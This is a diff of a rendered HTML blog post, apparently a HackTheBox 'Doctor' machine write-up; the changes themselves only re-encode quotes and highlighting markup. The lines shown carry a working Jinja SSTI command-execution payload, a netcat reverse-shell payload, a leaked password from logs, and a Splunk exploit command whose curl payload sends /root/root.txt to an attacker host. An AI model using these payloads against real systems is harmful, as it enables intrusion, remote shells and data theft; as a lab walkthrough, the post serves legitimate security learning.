@@ -284,7 +284,7 @@ the header while requesting the static content.</p>
 &lt; Date: Sun, 25 Oct 2020 02:39:20 GMT
 &lt; Server: Apache/2.4.41 (Ubuntu)
 &lt; Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
-&lt; ETag: &quot;4d88-5afad8bea6589&quot;
+&lt; ETag: &#34;4d88-5afad8bea6589&#34;
 &lt; Accept-Ranges: bytes
 &lt; Content-Length: 19848
 &lt; Vary: Accept-Encoding
@@ -296,7 +296,7 @@ giving up, I noticed an email in the contact information section. The &ldquo;sen
 <p><img src="/img/htb-doctor/email.png" alt=""></p>
 <p>At wit&rsquo;s end, I passed <code>doctors.htb</code> as the host in my request header by using the
 <code>--header &quot;Host: doctors.htb&quot;</code> flag with <code>curl</code>.</p>
-<pre tabindex="0"><code>$ curl -vvv http://10.10.10.209:80/ --header &quot;Host: doctors.htb&quot;
+<pre tabindex="0"><code>$ curl -vvv http://10.10.10.209:80/ --header &#34;Host: doctors.htb&#34;
 *   Trying 10.10.10.209:80...
 * Connected to 10.10.10.209 (10.10.10.209) port 80 (#0)
 &gt; GET / HTTP/1.1
@@ -314,11 +314,11 @@ giving up, I noticed an email in the contact information section. The &ldquo;sen
 &lt; Vary: Cookie
 &lt; Set-Cookie: session=&lt;some cookie&gt;; HttpOnly; Path=/
 &lt;
-&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
 &lt;title&gt;Redirecting...&lt;/title&gt;
 &lt;h1&gt;Redirecting...&lt;/h1&gt;
 * Connection #0 to host 10.10.10.209 left intact
-&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&quot;/login?next=%2F&quot;&gt;/login?next=%2F&lt;/a&gt;.  If not click the link.
+&lt;p&gt;You should be redirected automatically to target URL: &lt;a href=&#34;/login?next=%2F&#34;&gt;/login?next=%2F&lt;/a&gt;.  If not click the link.
 </code></pre><p>Bingo. Werkzeug/Python served this up (Server info in the header) and is actually redirecting us
 (<code>302</code> HTTP reponse) to <code>/login?next=%2F</code>. Things like this is what what made this machine
 difficult in my opinion and pushed my curiosity a bit &ndash; there is a lot of non technical things to
@@ -359,34 +359,34 @@ This is not the case here. Python is just taking the input and showing it as-is.
 <p>This part also took me more time than I&rsquo;d like to admit. Sometimes the clues are right under your
 nose. If we dig through the source code of the forum, you will find the following at the top of
 the body section</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarToggle&#34;</span>&gt;
-	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-nav mr-auto&#34;</span>&gt;
-		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;Home&lt;/<span style="color:#f92672">a</span>&gt;
-		<span style="color:#75715e">&lt;!--archive still under beta testing&lt;a class=&#34;nav-item nav-link&#34; href=&#34;/archive&#34;&gt;Archive&lt;/a&gt;--&gt;</span>
-	&lt;/<span style="color:#f92672">div</span>&gt;
-	<span style="color:#75715e">&lt;!-- Navbar Right Side --&gt;</span>
-</code></pre></div><p>Beta testing? Sounds promising&hellip; If we try going to <code>http://doctors.htb/archive</code>, we are met with
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse navbar-collapse&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbarToggle&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;navbar-nav mr-auto&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nav-item nav-link&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/home&#34;</span>&gt;Home&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">&lt;!--archive still under beta testing&lt;a class=&#34;nav-item nav-link&#34; href=&#34;/archive&#34;&gt;Archive&lt;/a&gt;--&gt;</span>
+</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">&lt;!-- Navbar Right Side --&gt;</span>
+</span></span></code></pre></div><p>Beta testing? Sounds promising&hellip; If we try going to <code>http://doctors.htb/archive</code>, we are met with
 a blank page. Looking at the response through our browser&rsquo;s dev tools, we see that it contains the
 titles of the messages we created in the forum earlier and that the injection recon we tried
 (<code>{{ 7*7 }}</code>) is actually computed (<code>&lt;title&gt;49&lt;/title&gt;</code>)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
-<span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span><span style="color:#f92672">&gt;</span>
-<span style="color:#f92672">&lt;channel&gt;</span>
-<span style="color:#f92672">&lt;title&gt;</span>Archive<span style="color:#f92672">&lt;/title&gt;</span>
-<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>asd<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
-
-		<span style="color:#f92672">&lt;/channel&gt;</span>
-		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>123<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
-
-		<span style="color:#f92672">&lt;/channel&gt;</span>
-		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>49<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
-
-		<span style="color:#f92672">&lt;/channel&gt;</span>
-</code></pre></div><p>This computation is enough to know that the templating engine is parsing the injection as valid
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;rss</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;2.0&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;channel&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;title&gt;</span>Archive<span style="color:#f92672">&lt;/title&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>asd<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/channel&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>123<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/channel&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;item&gt;&lt;title&gt;</span>49<span style="color:#f92672">&lt;/title&gt;&lt;/item&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">&lt;/channel&gt;</span>
+</span></span></code></pre></div><p>This computation is enough to know that the templating engine is parsing the injection as valid
 directives and executing it as Python code. It&rsquo;s time to see if we can get it to execute something
 on the command line through Python directives. The payload would look something like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
-</code></pre></div><p>Let&rsquo;s not go into crazy detail about this but what we&rsquo;re doing is requesting, through Python, that
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;whoami; id&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span></code></pre></div><p>Let&rsquo;s not go into crazy detail about this but what we&rsquo;re doing is requesting, through Python, that
 the remote machine executes the <code>whoami</code> and <code>id</code> shell commands. <code>whoami</code> informs us who the
 commands is being executed as (the user that is used to run the service on the server) and the
 <code>id</code> command gives us extra information about the said user.</p>
@@ -394,28 +394,28 @@ commands is being executed as (the user that is used to run the service on the s
 <a href="https://stackabuse.com/pythons-os-and-subprocess-popen-commands/">popen</a> documentation if you want
 to dig deeper into the popen function used to run shell commands.</p>
 <p>After adding that injection, we can browse back to the <code>/archive</code> endpoint to see the results</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
-&lt;<span style="color:#f92672">rss</span> <span style="color:#a6e22e">version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.0&#34;</span>&gt;
-&lt;<span style="color:#f92672">channel</span>&gt;
-&lt;<span style="color:#f92672">title</span>&gt;Archive&lt;/<span style="color:#f92672">title</span>&gt;
-&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;asd&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
-
-		&lt;/<span style="color:#f92672">channel</span>&gt;
-		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;123&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
-
-		&lt;/<span style="color:#f92672">channel</span>&gt;
-		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;49&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
-
-		&lt;/<span style="color:#f92672">channel</span>&gt;
-		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
-		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
-&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
-&lt;/<span style="color:#f92672">channel</span>&gt;
-</code></pre></div><p>Here&rsquo;s the part in the response that is of interest:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">		&lt;/<span style="color:#f92672">channel</span>&gt;
-		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
-		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
-</code></pre></div><p>The result is the output of our <code>whoami; id</code> command.  So now we know that we can run some shell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">rss</span> <span style="color:#a6e22e">version</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">channel</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Archive&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;asd&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">channel</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;123&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">channel</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt;49&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">channel</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
+</span></span><span style="display:flex;"><span>		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">title</span>&gt;&lt;/<span style="color:#f92672">item</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">channel</span>&gt;
+</span></span></code></pre></div><p>Here&rsquo;s the part in the response that is of interest:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">channel</span>&gt;
+</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">item</span>&gt;&lt;<span style="color:#f92672">title</span>&gt; web
+</span></span><span style="display:flex;"><span>		uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+</span></span></code></pre></div><p>The result is the output of our <code>whoami; id</code> command.  So now we know that we can run some shell
 commands through the templating engine and that we&rsquo;re in fact running these commands as the <code>web</code>
 user, who belongs to the <code>web</code> and <code>adm</code> groups.</p>
 <p>We&rsquo;re making good progress here and the next step is to try to acquire a
@@ -425,8 +425,8 @@ the process of moving out of our low privileged user (<code>web</code> in this c
 <p>Using the SSTI method outlined above, we can now try our hand at a reverse shell. Starting with <code>nc</code>
 (<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>) and using the most common method, I couldn&rsquo;t obtain
 successful results. Here&rsquo;s what the payload would have looked like</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;nc -e /usr/bin/sh &lt;ip&gt; 4545&#39;</span>)<span style="color:#f92672">.</span>read()}}
-</code></pre></div><p>By the way, <code>&lt;ip&gt;</code> should be replaced with our machine&rsquo;s IP address on the HackTheBox.eu network.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>application<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;nc -e /usr/bin/sh &lt;ip&gt; 4545&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span></code></pre></div><p>By the way, <code>&lt;ip&gt;</code> should be replaced with our machine&rsquo;s IP address on the HackTheBox.eu network.
 Then, on our machine, we would have executed the following netcat command</p>
 <pre tabindex="0"><code>nc -lvp 4545
 </code></pre><p>As stated above, I wasn&rsquo;t able to get netcat to execute <code>/usr/bin/sh</code> so I couldn&rsquo;t get the remote
@@ -448,7 +448,7 @@ commands.</p>
 <p>This new revised command grants us the reverse shell we are after.</p>
 <pre tabindex="0"><code>$ nc -lvp 4545
 Connection from 10.10.10.209:47142
-/usr/bin/sh: 0: can't access tty; job control turned off
+/usr/bin/sh: 0: can&#39;t access tty; job control turned off
 $ ls -la
 total 48
 drwxr-xr-x 6 web  web  4096 Sep 28 15:04 .
@@ -499,9 +499,9 @@ for passwords, failed authentication attemps, errors, that sort of thing.</p>
 matches our search criteria of <code>password</code>. Not shown here since it would take up a good amount of
 space, but the number of matches was pretty large. Spending a good amount of time looking at the
 matches payed off as the following line struck my curiosity nerve:</p>
-<pre tabindex="0"><code>$ grep -r -i &quot;password&quot; /var/log
+<pre tabindex="0"><code>$ grep -r -i &#34;password&#34; /var/log
 ...
-/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &#34;POST /reset_password?email=Guitar123&#34; 500 453 &#34;http://doctor.htb/reset_password&#34;
 ...
 $
 </code></pre><p>Interesting. A <code>POST</code> request to some sort of password reset endpoint on the server (it was found in
@@ -560,7 +560,7 @@ web         1734  0.0  0.0  17668   656 ?        S    00:07   0:00 grep splunkd
 tool, all we have to do is set it up so that <code>PySplunkWhisperer2_remote</code> sends us the
 <code>/root/root.txt</code> file. Since we already validated that we can use <code>shaun</code>&rsquo;s credentials for Splunk,
 that&rsquo;s what we&rsquo;ll pump into <code>PySplunkWhisperer2</code> for the user name and password.</p>
-<pre tabindex="0"><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;ip&gt;:4545&quot; --lhost &lt;ip&gt;
+<pre tabindex="0"><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &#34;Guitar123&#34; --payload &#34;curl -F &#39;data=@/root/root.txt&#39; http://&lt;ip&gt;:4545&#34; --lhost &lt;ip&gt;
 </code></pre><p>In the above command, as previously stated, <code>&lt;ip&gt;</code> has to be replaced with your machine&rsquo;s IP address
 on the HackTheBox.eu network. We also need to setup netcat to receive the content with the following
 command</p>
@@ -574,7 +574,7 @@ Content-Length: 219
 Content-Type: multipart/form-data; boundary=------------------------1e3af6b22be334f1
 
 --------------------------1e3af6b22be334f1
-Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;root.txt&quot;
+Content-Disposition: form-data; name=&#34;data&#34;; filename=&#34;root.txt&#34;
 Content-Type: text/plain
 
 fe46f36187c9299663d023c7f9bd1d74
